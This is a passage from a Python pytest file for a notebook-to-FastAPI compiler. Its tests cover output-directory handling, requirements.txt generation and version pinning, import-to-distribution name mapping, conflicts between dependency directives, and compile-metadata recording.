    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "backend"

    with pytest.raises(ValueError, match="this tool's own top-level package"):
        compile_notebook(str(notebook_path), str(output_dir))

    assert not (output_dir / "app.py").exists()


def test_compiler_pipeline_rejects_output_dir_colliding_with_an_installed_package(
    tmp_path,
):
    """End-to-end confirmation that compile_notebook itself -- not just
    the package_name_for_output_dir helper in isolation -- refuses to
    compile into an --output directory whose basename shadows an
    installed package, and does so before writing anything.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "fastapi"

    with pytest.raises(ValueError, match="already-installed"):
        compile_notebook(str(notebook_path), str(output_dir))

    # The collision is rejected before anything is actually written --
    # only the (empty) output directory itself may exist, from
    # compile_notebook_to_api's own os.makedirs call that precedes the
    # package-name check.
    assert not (output_dir / "app.py").exists()


def test_compiler_pipeline_respects_custom_output_dir(tmp_path):
    """The --output flag is documented as configurable (it has a CLI flag
    with a default), but write_runtime_module used to hardcode
    "generated/runtime/..." regardless of output_dir while the generated
    app.py always imported the fixed name "generated" -- so any non-
    default --output directory produced files in the wrong place with an
    import that could never resolve them.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n"
            "    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "my_custom_output"

    compile_notebook(str(notebook_path), str(output_dir))

    # The runtime module must live under the actual output directory, not
    # the old hardcoded "generated/runtime/" path.
    assert (output_dir / "runtime" / "notebook_module.py").exists()

    generated_app = (output_dir / "app.py").read_text(encoding="utf-8")
    ast.parse(generated_app)
    assert "import my_custom_output.runtime.notebook_module" in generated_app

    dockerfile = (output_dir / "Dockerfile").read_text(encoding="utf-8")
    assert "COPY . my_custom_output/" in dockerfile
    assert "uvicorn my_custom_output.app:app" in dockerfile


def test_compiler_pipeline_custom_output_dir_actually_runs(tmp_path):
    """Static checks confirm the generated files are consistent with each
    other; this drives a real request through the compiled app with a
    custom --output directory to confirm it actually imports and runs,
    not just that the generated source text looks right. Run in a fresh
    subprocess/cwd since the generated package name and its import must
    be resolved by a real Python import machinery run from the directory
    compilation happened in.
    """

    workdir = tmp_path / "workdir"
    workdir.mkdir()

    notebook_path = workdir / "nb.ipynb"
    notebook_path.write_text(
        json.dumps(
            {
                "nbformat": 4,
                "nbformat_minor": 5,
                "metadata": {},
                "cells": [
                    {
                        "cell_type": "code",
                        "execution_count": None,
                        "metadata": {},
                        "outputs": [],
                        "source": (
                            "def add(a: int, b: int) -> int:\n"
                            "    return a + b\n"
                        ),
                    }
                ],
            }
        ),
        encoding="utf-8",
    )

    script = f"""
import sys
sys.path.insert(0, {str(PROJECT_ROOT)!r})
sys.path.insert(0, {str(workdir)!r})

from backend.compiler import compile_notebook

compile_notebook({str(notebook_path)!r}, "my_custom_output")

from my_custom_output.app import app
from fastapi.testclient import TestClient

client = TestClient(app)
resp = client.post(
    "/add",
    json={{"a": 2, "b": 3}},
    headers={{"X-API-Key": "notebook-to-api-dev-key"}},
)
assert resp.status_code == 200, resp.text
assert resp.json() == {{"result": 5}}, resp.json()
print("CUSTOM_OUTPUT_DIR_E2E_OK")
"""

    proc = subprocess.run(
        [sys.executable, "-c", script],
        cwd=str(workdir),
        capture_output=True,
        text=True,
        timeout=60,
    )

    assert proc.returncode == 0, proc.stdout + proc.stderr
    assert "CUSTOM_OUTPUT_DIR_E2E_OK" in proc.stdout


def test_standard_libs_covers_common_stdlib_modules_beyond_the_old_hardcoded_list():
    """The old STANDARD_LIBS was a hand-picked set of 12 names, missing
    the vast majority of the standard library. Any notebook using one of
    the missed modules got it written into requirements.txt as if it were
    a third-party PyPI package -- and for some names (e.g. "asyncio"),
    PyPI has an unrelated real package that pip actually installs,
    shadowing the built-in module.
    """

    commonly_missed = {
        "asyncio", "random", "logging", "subprocess", "csv", "sqlite3",
        "uuid", "hashlib", "threading", "shutil", "glob", "base64",
        "enum", "dataclasses", "copy", "pickle", "warnings", "traceback",
        "inspect", "urllib", "string", "decimal", "tempfile", "io",
    }

    assert commonly_missed <= STANDARD_LIBS


def test_standard_libs_does_not_exclude_third_party_packages():

    third_party = {"pandas", "numpy", "requests", "sklearn", "fastapi"}

    assert not (third_party & STANDARD_LIBS)


def test_compiler_pipeline_excludes_stdlib_modules_from_requirements(tmp_path):

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "import asyncio\n"
            "import random\n"
            "import pandas as pd\n\n"
            "def compute(x: int) -> int:\n"
            "    return x\n"
        )
    )

    notebook_path = tmp_path / "stdlib_imports.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    requirements = (output_dir / "requirements.txt").read_text(
        encoding="utf-8"
    )
    # Dependencies are pinned to "name==version" when the compiling
    # environment has the package installed (see
    # test_requirements_pins_installed_dependency_versions), so a
    # dependency line no longer necessarily equals the bare package name.
    dep_names = {line.split("==")[0] for line in requirements.split()}

    assert "asyncio" not in dep_names
    assert "random" not in dep_names
    assert "pandas" in dep_names


def test_compiler_pipeline_maps_a_dangerously_ambiguous_import_to_its_real_pypi_name(
    tmp_path,
):
    """Confirmed missing before this fix: PyPI hosts a real, unrelated,
    unofficial package under the bare import name "dotenv" -- unmapped,
    requirements.txt listed "dotenv" itself, and `pip install -r
    requirements.txt` in the generated Dockerfile's build would silently
    install the *wrong* package instead of python-dotenv, the one the
    notebook actually needs.
    """

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "from dotenv import load_dotenv\n\n"
            "def get_config() -> dict:\n"
            "    return {}\n"
        )
    )

    notebook_path = tmp_path / "dotenv_import.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_path), str(output_dir))

    requirements = (output_dir / "requirements.txt").read_text(
        encoding="utf-8"
    )
    dep_names = {line.split("==")[0] for line in requirements.split()}

    assert "python-dotenv" in dep_names
    assert "dotenv" not in dep_names


def test_requirements_omits_watchdog(tmp_path):
    """watchdog is a dependency of this tool's own `serve` command (hot
    recompilation while developing locally) -- the generated app itself
    never imports it (see generator/api_generator.py). Before this fix,
    every compiled app shipped it as an unused line in requirements.txt
    and, from there, an unused package baked into its Docker image.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    requirements = (output_dir / "requirements.txt").read_text(encoding="utf-8")

    assert "watchdog" not in requirements


def test_requirements_pins_core_dependencies_to_installed_versions(tmp_path):

    import importlib.metadata

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    requirements = (output_dir / "requirements.txt").read_text(encoding="utf-8")
    lines = set(requirements.split())

    for package in ("fastapi", "uvicorn", "pydantic"):
        installed_version = importlib.metadata.version(package)
        assert f"{package}=={installed_version}" in lines


def test_requirements_pins_a_notebook_dependency_installed_in_this_environment(
    tmp_path
):
    """Without pinning, requirements.txt just listed the bare package
    name -- `pip install -r requirements.txt` at deploy time would then
    resolve whatever the latest release happens to be, not the version
    the notebook was actually compiled and tested against.

    Uses nbformat as the notebook's import: it's a hard dependency of
    this very test file (imported at the top), so it's guaranteed
    installed in any environment capable of running this suite at all --
    unlike pandas, which this test used before and which isn't listed in
    the project's requirements.txt, so it's absent in a clean CI install
    and importlib.metadata.version() raised PackageNotFoundError there
    (confirmed: this test only ever passed locally by accident, because
    pandas happened to already be installed in that environment for
    unrelated reasons).
    """

    import importlib.metadata

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "import nbformat\n\n"
            "def summarize(count: int) -> int:\n    return count * 2\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    requirements = (output_dir / "requirements.txt").read_text(encoding="utf-8")

    installed_nbformat_version = importlib.metadata.version("nbformat")
    assert f"nbformat=={installed_nbformat_version}" in requirements.split()


def test_requirements_falls_back_to_a_bare_name_for_an_uninstalled_dependency(
    tmp_path
):
    """A notebook can import a third-party library the machine compiling
    it doesn't happen to have installed -- this tool has no way to look up
    a version it can't introspect, so the previous, unpinned behavior
    (just the bare name) must still be used instead of failing the
    compile outright.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "import definitely_not_installed_pkg_hopefully\n\n"
            "def noop() -> int:\n    return 1\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    requirements = (output_dir / "requirements.txt").read_text(encoding="utf-8")
    lines = set(requirements.split())

    assert "definitely_not_installed_pkg_hopefully" in lines


def test_pinned_requirement_helper_pins_an_installed_package():

    import importlib.metadata

    from backend.compiler import _pinned_requirement

    assert _pinned_requirement("pytest") == f"pytest=={importlib.metadata.version('pytest')}"


def test_pinned_requirement_helper_falls_back_for_an_unknown_package():

    from backend.compiler import _pinned_requirement

    assert _pinned_requirement("definitely_not_a_real_package_xyz") == (
        "definitely_not_a_real_package_xyz"
    )


def test_pinned_requirement_helper_strips_a_pep440_local_version_segment(monkeypatch):
    """PyPI rejects any upload whose version contains a "+" (PEP 440's
    local version segment) -- it exists specifically to distinguish a
    locally-modified build (a CUDA-specific wheel, a setuptools-scm/git
    "+dirty" build, an editable install, ...) from the public release it's
    based on, never to be redistributed itself. Pinning the exact local
    version importlib.metadata.version() reports bakes an unresolvable
    "package==version+local" line into requirements.txt: confirmed
    reproduced against a real `pip install` of exactly this kind of pin,
    which fails with "No matching distribution found for ...".
    """

    import backend.compiler as compiler_module

    monkeypatch.setattr(
        compiler_module.importlib.metadata,
        "version",
        lambda package_name: "2.1.0+cu121",
    )

    assert compiler_module._pinned_requirement("torch_local_version_test") == (
        "torch_local_version_test==2.1.0"
    )


def test_pinned_requirement_helper_leaves_an_ordinary_version_untouched(monkeypatch):
    """The common case -- no "+" in the reported version at all -- must
    behave exactly as before: pinned to the full version string, unchanged.
    """

    import backend.compiler as compiler_module

    monkeypatch.setattr(
        compiler_module.importlib.metadata,
        "version",
        lambda package_name: "1.2.3",
    )

    assert compiler_module._pinned_requirement("ordinary_version_test") == (
        "ordinary_version_test==1.2.3"
    )


def test_requirements_strips_a_local_version_segment_from_a_pinned_dependency(
    tmp_path, monkeypatch
):
    """End-to-end: a notebook importing a package whose installed version
    happens to carry a PEP 440 local version segment must still get a
    requirements.txt pin that `pip install` can actually resolve, not the
    unresolvable exact local build.
    """

    import backend.compiler as compiler_module

    real_version = compiler_module.importlib.metadata.version

    def fake_version(package_name):
        if package_name == "local_version_dependency_test":
            return "0.1.0+dirty"
        return real_version(package_name)

    monkeypatch.setattr(compiler_module.importlib.metadata, "version", fake_version)
    monkeypatch.setattr(
        compiler_module,
        "distribution_name_for_import",
        lambda import_name: (
            "local_version_dependency_test"
            if import_name == "local_version_dependency_test"
            else import_name
        ),
    )

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "import local_version_dependency_test\n\n"
            "def noop() -> int:\n    return 1\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    requirements = (output_dir / "requirements.txt").read_text(encoding="utf-8")
    lines = set(requirements.split())

    assert "local_version_dependency_test==0.1.0" in lines
    assert "local_version_dependency_test==0.1.0+dirty" not in lines
    assert not any("+dirty" in line for line in lines)


def test_resolve_requirements_drops_the_auto_detected_line_that_conflicts_with_an_explicit_one():
    """A notebook importing a package directly while also declaring
    "# notebook-to-api: requires <same-package>==<version>" (to pin a
    specific version this tool's own auto-resolution wouldn't otherwise
    choose) previously got *both* lines written to requirements.txt --
    confirmed exploitable: two version-pinned lines for the same
    distribution is a requirement pip refuses outright ("Double
    requirement given"), breaking `deploy`'s own Docker build over
    exactly the kind of explicit override this directive exists to let a
    notebook author make. The explicit line must win.
    """

    requirements = resolve_requirements(
        ["numpy"], explicit_requirements=["numpy==1.24.0"]
    )

    numpy_lines = [line for line in requirements if line.split("==")[0] == "numpy"]
    assert numpy_lines == ["numpy==1.24.0"]


def test_resolve_requirements_conflict_detection_is_case_insensitive():
    """PyPI distribution names are themselves case-insensitive -- pip
    normalizes "NumPy"/"numpy"/"nUmPy" to the identical project -- so a
    directive spelled differently than distribution_name_for_import's
    own resolved name must still be recognized as the same package.
    """

    requirements = resolve_requirements(
        ["numpy"], explicit_requirements=["NumPy==1.24.0"]
    )

    numpy_lines = [
        line for line in requirements if line.lower().split("==")[0] == "numpy"
    ]
    assert numpy_lines == ["NumPy==1.24.0"]


def test_resolve_requirements_conflict_detection_normalizes_hyphens_and_underscores(
    monkeypatch,
):
    """PyPI normalizes "-"/"_"/"." runs in a project name to a single "-"
    (PEP 503), not just case -- "python-dateutil" and "python_dateutil"
    are the identical distribution to pip. Confirmed exploitable with
    only case-folding (what this check used to do): a notebook `import
    dateutil` (auto-resolving to "python-dateutil" via
    distribution_name_for_import) alongside its own "# notebook-to-api:
    requires python_dateutil==2.9.0" -- an entirely ordinary, pip-valid
    way to spell that pin -- produced *both* "python-dateutil==<auto>"
    and "python_dateutil==2.9.0" in requirements.txt, the identical
    "Double requirement given" pip failure this same conflict-detection
    already exists to prevent, just reproduced through a separator
    difference instead of a case one. distribution_name_for_import is
    monkeypatched here (not a real installed package) so this test's own
    result doesn't depend on what happens to be installed in whatever
    environment runs it.
    """
    import backend.compiler as compiler_module

    monkeypatch.setattr(
        compiler_module,
        "distribution_name_for_import",
        lambda import_name: (
            "python-dateutil" if import_name == "dateutil" else import_name
        ),
    )

    requirements = resolve_requirements(
        ["dateutil"], explicit_requirements=["python_dateutil==2.9.0"]
    )

    dateutil_lines = [
        line for line in requirements
        if _normalize_distribution_name(line.split("==")[0]) == "python-dateutil"
    ]
    assert dateutil_lines == ["python_dateutil==2.9.0"]


def test_resolve_requirements_keeps_auto_detected_lines_with_no_explicit_conflict():

    requirements = resolve_requirements(
        ["requests"], explicit_requirements=["a-private-pkg==1.0.0"]
    )

    assert any(line.startswith("requests") for line in requirements)
    assert "a-private-pkg==1.0.0" in requirements


def test_resolve_requirements_raises_when_an_explicit_requirement_conflicts_with_an_exclude(
    monkeypatch,
):
    """Confirmed exploitable before this fix: extract_third_party_imports
    already drops an excluded import from the auto-detected side, but a
    stale/leftover "# notebook-to-api: requires numpy==1.24.0" left
    behind after adding "# notebook-to-api: exclude numpy" (e.g. numpy
    already vendored into a custom base image) still made it into
    requirements.txt unfiltered -- silently overriding the author's own
    explicit opt-out.
    """
    import backend.compiler as compiler_module

    monkeypatch.setattr(
        compiler_module, "distribution_name_for_import", lambda name: name
    )

    with pytest.raises(ValueError, match="exclude numpy"):
        resolve_requirements(
            [], explicit_requirements=["numpy==1.24.0"],
            excluded_imports={"numpy"},
        )


def test_resolve_requirements_exclude_conflict_resolves_distribution_name(
    monkeypatch,
):
    """"exclude" names a raw *import* name ("cv2") while "requires" names
    a PyPI *distribution* name ("opencv-python") -- the two frequently
    differ (see distribution_name_for_import), so the conflict check must
    resolve "cv2" through it rather than comparing literal text.
    """
    import backend.compiler as compiler_module

    monkeypatch.setattr(
        compiler_module,
        "distribution_name_for_import",
        lambda name: "opencv-python" if name == "cv2" else name,
    )

    with pytest.raises(ValueError, match="exclude cv2"):
        resolve_requirements(
            [], explicit_requirements=["opencv-python==4.9.0.80"],
            excluded_imports={"cv2"},
        )


def test_resolve_requirements_no_conflict_when_excluded_import_is_unrelated():

    requirements = resolve_requirements(
        ["requests"], explicit_requirements=["numpy==1.24.0"],
        excluded_imports={"pytest"},
    )

    assert "numpy==1.24.0" in requirements


def test_compile_raises_when_a_requires_directive_conflicts_with_an_exclude_directive(
    tmp_path
):

    notebook = nbformat.v4.new_notebook()

    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "# notebook-to-api: exclude numpy\n"
            "# notebook-to-api: requires numpy==1.24.0\n"
            "import numpy\n\n"
            "def process(x: int) -> int:\n    return x\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"

    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    with pytest.raises(ValueError, match="exclude numpy"):
        compile_notebook_to_api(str(notebook_path), str(tmp_path / "generated"))


def test_compile_drops_the_auto_detected_dependency_that_conflicts_with_an_explicit_pin(
    tmp_path
):
    """Uses python-multipart the same way
    test_requirements_resolves_an_import_name_to_its_actual_distribution_name
    (below) does: its import name ("multipart") differs from its
    distribution name ("python-multipart") -- so the explicit directive
    here, naming the *distribution*, must still suppress the
    auto-detected import's own resolved "python-multipart==<installed>"
    line, not just an exact-text match against the raw import name.
    """

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "# notebook-to-api: requires python-multipart==999.0.0\n"
            "import multipart\n\n"
            "def noop() -> int:\n    return 1\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    requirements = (output_dir / "requirements.txt").read_text(encoding="utf-8")
    lines = requirements.split()

    multipart_lines = [
        line for line in lines if line.split("==")[0] == "python-multipart"
    ]
    assert multipart_lines == ["python-multipart==999.0.0"]


def test_compile_raises_for_conflicting_explicit_requirement_directives(tmp_path):

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "# notebook-to-api: requires numpy==1.24.0\n"
            "# notebook-to-api: requires numpy==1.26.0\n"
            "def noop() -> int:\n    return 1\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"

    with pytest.raises(ValueError, match="numpy"):
        compile_notebook(str(notebook_path), str(output_dir))


def test_compile_with_conflicting_requirements_does_not_corrupt_a_previous_good_compile(
    tmp_path
):
    """Mirrors the identical "output_dir left in an inconsistent state"
    regression compile_notebook_to_api's own comment above (right before
    generate_fastapi_code is called) already documents fixing for a
    ReservedFunctionNameError -- this closes the same class of bug for a
    conflicting-requirements notebook: recompiling a working app with one
    must leave every file from the last working compile completely
    untouched, not a torn mix of the old app.py/Dockerfile alongside a
    requirements.txt already rewritten from the failing notebook.
    """

    good_notebook = nbformat.v4.new_notebook()
    good_notebook.cells.append(
        nbformat.v4.new_code_cell("def add(a: int, b: int) -> int:\n    return a + b\n")
    )
    good_notebook_path = tmp_path / "good.ipynb"
    with open(good_notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(good_notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(good_notebook_path), str(output_dir))

    app_py_before = (output_dir / "app.py").read_text(encoding="utf-8")
    requirements_before = (output_dir / "requirements.txt").read_text(encoding="utf-8")

    bad_notebook = nbformat.v4.new_notebook()
    bad_notebook.cells.append(
        nbformat.v4.new_code_cell(
            "# notebook-to-api: requires numpy==1.24.0\n"
            "# notebook-to-api: requires numpy==1.26.0\n"
            "def multiply(a: int, b: int) -> int:\n    return a * b\n"
        )
    )
    bad_notebook_path = tmp_path / "bad.ipynb"
    with open(bad_notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(bad_notebook, f)

    with pytest.raises(ValueError, match="numpy"):
        compile_notebook(str(bad_notebook_path), str(output_dir))

    assert (output_dir / "app.py").read_text(encoding="utf-8") == app_py_before
    assert (
        (output_dir / "requirements.txt").read_text(encoding="utf-8")
        == requirements_before
    )


def test_requirements_resolves_an_import_name_to_its_actual_distribution_name(
    tmp_path
):
    """A notebook's `import` statement names a *module*, not necessarily
    the PyPI *distribution* that provides it -- `pip install <name>` only
    works for the latter, and the two frequently differ. Before this,
    write_requirements wrote the raw import name straight into
    requirements.txt unchanged, so `pip install -r requirements.txt` --
    and from there every `deploy`/`docker build` -- failed outright for
    any notebook using one of these.

    Uses python-multipart as the notebook's import: its import name
    ("multipart") differs from its distribution name ("python-multipart"),
    and it's a direct, guaranteed dependency of this very project (see
    requirements.txt) -- reliably installed in any environment capable of
    running this suite at all, the same reliability rationale
    test_requirements_pins_a_notebook_dependency_installed_in_this_environment
    (just above) already documents for its own choice of nbformat.
    """

    import importlib.metadata

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "import multipart\n\n"
            "def noop() -> int:\n    return 1\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    requirements = (output_dir / "requirements.txt").read_text(encoding="utf-8")
    lines = set(requirements.split())

    installed_version = importlib.metadata.version("python-multipart")
    assert f"python-multipart=={installed_version}" in lines
    # Must not also (or instead) list the raw, uninstallable import name.
    assert "multipart" not in lines
    assert not any(line.startswith("multipart==") for line in lines)


def test_requirements_deduplicates_distinct_imports_resolving_to_the_same_distribution(
    tmp_path, monkeypatch
):
    """Two distinct import names occasionally resolve to the same PyPI
    distribution (e.g. "attr" and "attrs" are both provided by the
    "attrs" distribution) -- this must not write a duplicate
    requirements.txt line for it.
    """

    import backend.compiler as compiler_module

    monkeypatch.setattr(
        compiler_module,
        "distribution_name_for_import",
        lambda import_name: "shared_distribution_test_pkg",
    )

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "import alias_one\n"
            "import alias_two\n\n"
            "def noop() -> int:\n    return 1\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    requirements = (output_dir / "requirements.txt").read_text(encoding="utf-8")
    lines = requirements.split()

    assert lines.count("shared_distribution_test_pkg") == 1


def test_distribution_name_for_import_helper_resolves_a_known_alias():

    from backend.compiler import distribution_name_for_import

    assert distribution_name_for_import("multipart") == "python-multipart"


def test_distribution_name_for_import_helper_falls_back_for_an_unknown_import():

    from backend.compiler import distribution_name_for_import

    assert distribution_name_for_import("definitely_not_a_real_import_xyz") == (
        "definitely_not_a_real_import_xyz"
    )


def test_compile_writes_metadata_recording_the_source_notebook(tmp_path):
    """Nothing on disk (or via the API) previously recorded which
    notebook produced a given `generated/` output -- GET /api/notebooks
    had no way to say "this is the one currently compiled" as a result
    (see test_list_notebooks_marks_the_currently_compiled_notebook in
    test_upload_routes.py).
    """

    import json

    from backend.compiler import COMPILE_METADATA_FILENAME

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    metadata_path = output_dir / COMPILE_METADATA_FILENAME
    assert metadata_path.exists()

    metadata = json.loads(metadata_path.read_text(encoding="utf-8"))

    assert metadata["source_notebook"] == str(notebook_path.resolve())
    assert "compiled_at" in metadata

    # Must be a real, parseable ISO 8601 UTC timestamp, not just any string.
    from datetime import datetime
    parsed = datetime.fromisoformat(metadata["compiled_at"])
    assert parsed.tzinfo is not None


def test_compile_metadata_records_an_absolute_path_even_for_a_relative_input(
    tmp_path, monkeypatch
):

    import json

    from backend.compiler import COMPILE_METADATA_FILENAME

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )

    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    monkeypatch.chdir(tmp_path)

    compile_notebook("nb.ipynb", "built")

    metadata_path = Path("built") / COMPILE_METADATA_FILENAME
    metadata = json.loads(metadata_path.read_text(encoding="utf-8"))

    assert Path(metadata["source_notebook"]).is_absolute()
    assert Path(metadata["source_notebook"]) == notebook_path.resolve()


def test_compile_notebook_with_a_source_notebook_path_records_it_but_hashes_the_compiled_content(
    tmp_path,
):
    """compile_notebook's own "source_notebook_path" -- used by POST
    /api/compile's "version_id" (backend/routes/upload.py) to compile one
    of a notebook's own previously snapshotted versions without restoring
    it over the notebook's current content -- must record the *real*
    notebook as "source_notebook" while hashing the content that actually
    got compiled (the version snapshot), not the real notebook's own
    current (different) content.
    """

    import json

    from backend.compiler import COMPILE_METADATA_FILENAME, hash_notebook_file

    real_notebook = nbformat.v4.new_notebook()
    real_notebook.cells.append(
        nbformat.v4.new_code_cell(
            "def multiply(a: int, b: int) -> int:\n    return a * b\n"
        )
    )
    real_notebook_path = tmp_path / "nb.ipynb"
    with open(real_notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(real_notebook, f)

    old_version = nbformat.v4.new_notebook()
    old_version.cells.append(
        nbformat.v4.new_code_cell(
            "def add(a: int, b: int) -> int:\n    return a + b\n"
        )
    )
    old_version_path = tmp_path / "nb_v1.ipynb"
    with open(old_version_path, "w", encoding="utf-8") as f:
        nbformat.write(old_version, f)

    output_dir = tmp_path / "generated"
    compile_notebook(
        str(old_version_path),
        str(output_dir),
        source_notebook_path=str(real_notebook_path),
    )

    app_code = (output_dir / "app.py").read_text(encoding="utf-8")
    assert "add" in app_code
    assert "multiply" not in app_code

    metadata_path = output_dir / COMPILE_METADATA_FILENAME
    metadata = json.loads(metadata_path.read_text(encoding="utf-8"))

    assert metadata["source_notebook"] == str(real_notebook_path.resolve())
    assert metadata["source_notebook_sha256"] == hash_notebook_file(str(old_version_path))
    assert metadata["source_notebook_sha256"] != hash_notebook_file(str(real_notebook_path))


def test_compile_notebook_records_the_given_version_id(tmp_path):

    import json

    from backend.compiler import COMPILE_METADATA_FILENAME

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell("def add(a: int, b: int) -> int:\n    return a + b\n")
    )
    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(
        str(notebook_path), str(output_dir), version_id="20260101T000000000000_abcd.ipynb",
    )

    metadata_path = output_dir / COMPILE_METADATA_FILENAME
    metadata = json.loads(metadata_path.read_text(encoding="utf-8"))

    assert metadata["compiled_version_id"] == "20260101T000000000000_abcd.ipynb"


def test_compile_notebook_records_a_null_version_id_by_default(tmp_path):

    import json

    from backend.compiler import COMPILE_METADATA_FILENAME

    notebook = nbformat.v4.new_notebook()
    notebook.cells.append(
        nbformat.v4.new_code_cell("def add(a: int, b: int) -> int:\n    return a + b\n")
    )
    notebook_path = tmp_path / "nb.ipynb"
    with open(notebook_path, "w", encoding="utf-8") as f:
        nbformat.write(notebook, f)

    output_dir = tmp_path / "generated"
    compile_notebook(str(notebook_path), str(output_dir))

    metadata_path = output_dir / COMPILE_METADATA_FILENAME
    metadata = json.loads(metadata_path.read_text(encoding="utf-8"))

    assert metadata["compiled_version_id"] is None


def test_recompiling_overwrites_the_previous_compile_metadata(tmp_path):

    import json

    from backend.compiler import COMPILE_METADATA_FILENAME

    def _make_notebook(path, source):
        notebook = nbformat.v4.new_notebook()
        notebook.cells.append(nbformat.v4.new_code_cell(source))
        with open(path, "w", encoding="utf-8") as f:
            nbformat.write(notebook, f)

    notebook_a = tmp_path / "a.ipynb"
    notebook_b = tmp_path / "b.ipynb"
    _make_notebook(notebook_a, "def add(a: int, b: int) -> int:\n    return a + b\n")
    _make_notebook(notebook_b, "def sub(a: int, b: int) -> int:\n    return a - b\n")

    output_dir = tmp_path / "generated"

    compile_notebook(str(notebook_a), str(output_dir))
    compile_notebook(str(notebook_b), str(output_dir))

    metadata_path = output_dir / COMPILE_METADATA_FILENAME
    metadata = json.loads(metadata_path.read_text(encoding="utf-8"))

    assert metadata["source_notebook"] == str(notebook_b.resolve())


def test_recompile_removes_stale_compile_metadata_when_a_later_write_step_fails(
    tmp_path, monkeypatch
